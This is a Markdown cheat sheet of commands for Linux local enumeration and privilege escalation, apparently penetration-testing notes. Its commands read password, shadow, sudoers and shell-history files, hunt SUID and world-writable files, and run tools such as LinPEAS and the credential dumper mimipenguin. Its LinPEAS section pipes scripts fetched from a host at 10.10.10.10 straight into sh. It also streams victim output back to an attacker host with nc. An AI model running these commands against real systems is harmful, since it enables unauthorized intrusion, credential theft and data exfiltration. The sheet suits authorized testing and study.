# Local Enumeration
##### Current User
```bash
id
```

##### Kernel Version
```bash
uname -a
```

##### Current User Information
```bash
grep $USER /etc/passwd
```

##### Most Recent Logins
```bash
lastlog
```

##### Currently Logged-on Users
```bash
w
```

##### Last Logged-on Users
```bash
last
```

##### All Users with UID & GID Information
```bash
for user in $(cat /etc/passwd | cut -f1 -d":"); do id $user; done
```

##### List All root Accounts
```bash
cat /etc/passwd | cut -f1,3,4 -d":" | grep "0:0" | cut -f1 -d":" | awk '{print $1}'
```

##### List Users / Read passwd
```bash
cat /etc/passwd
```

##### Check shadow readability
```bash
cat /etc/shadow
```

##### Check sudo abilities
```bash
# All
sudo -l

# Known binaries to establish shell
sudo -l | grep vim
sudo -l | grep nmap
sudo -l | grep vi
```

##### Check sudoers readability
```bash
cat /etc/sudoers
```

##### Check bash history readability
```bash
# For root
cat /root/.bash_history

# For all other users
find /home/* -name *.*history* -print 2>/dev/null
```

##### Operating System
```bash
cat /etc/issue
cat /etc/*-release
```

##### List root's home directory
```bash
ls -als /root/
```

##### Check current $PATH variable
```bash
echo $PATH
```

##### Cron Jobs
```bash
# List all
cat /etc/crontab && ls -als /etc/cron*

# World-writeable
find /etc/cron* -type f -perm -o+w -exec ls -l {} \;
```

##### Processes
```bash
# All running
ps auxwww

# Running as root
ps -u root

# Running as current user
ps -u $USER
```

##### SUID / GUID
```bash
# Find SUID files
find / -perm -4000 -type f 2>/dev/null
# Find SUID files owned by root
find / -uid 0 -perm -4000 -type f 2>/dev/null
# Find GUID files
find / -perm -2000 -type f 2>/dev/null
```

##### World-writeable files
```bash
find / -perm -2 -type f 2>/dev/null
```

##### Config files in /etc
```bash
# Find all
ls -al /etc/*.conf

# Find all that contain the string "pass"
grep pass* /etc/*.conf
```

##### List open files
```bash
lsof -n
```

##### List installed packages (Debian)
```bash
dpkg -l
```

##### Common Software Versions
```bash
sudo -V
httpd -v
apache2 -v
mysql -V
sendmail -d0.1
```

##### List process binaries/paths & permissions
```bash
ps aux | awk '{print $11}' | xargs -r ls -la 2>/dev/null | awk '!x[$0]++'
```

# 3rd Party Tools
##### LinEnum
```bash
./LinEnum.sh -s -r report -e /tmp/ -t
```
##### LinuxPrivChecker
```bash
# Running on Legacy Python 2.6/2.7 System
wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
python linuxprivchecker.py -w -o linuxprivchecker.log

# Running Later Versions of Python
pip install linuxprivchecker
linuxprivchecker -w -o linuxprivchecker.log
# if runpy fails to add the script to your path
python3 -m linuxprivchecker -w -o linuxprivchecker.log
```

##### Unix-privesc-check
```bash
wget "https://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz"
./unix-privesc-check > output.txt
```

##### mimipenguin
```bash
git clone https://github.com/huntergregal/mimipenguin.git
cd mimipenguin
chmod +x mimipenguin.sh
./mimipenguin.sh
```

##### UNIX-PrivEsc
```bash
https://github.com/FuzzySecurity/Unix-PrivEsc
```

##### LinPEAS
```bash
# From github
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Local network
sudo python -m SimpleHTTPServer 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victi

# Output to file
./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
less -r /dev/shm/linpeas.txt #Read with colors

# Use a linpeas binary
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64
```

# References
[LinEnum](https://github.com/rebootuser/LinEnum)

[LinuxPrivChecker](https://github.com/sleventyeleven/linuxprivchecker)

[Unix-privesc-check](https://pentestmonkey.net/tools/audit/unix-privesc-check)

[mimipenguin](https://github.com/huntergregal/mimipenguin)

[Local Linux Enumeration & Privilege Escalation Cheatsheet](https://web.archive.org/web/20200218150604/https:/www.rebootuser.com/?p=1623)

[Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

[Unix-PrivEsc](https://github.com/FuzzySecurity/Unix-PrivEsc)

[PEASS (LinPEAS / WinPEAS)](https://github.com/carlospolop/PEASS-ng)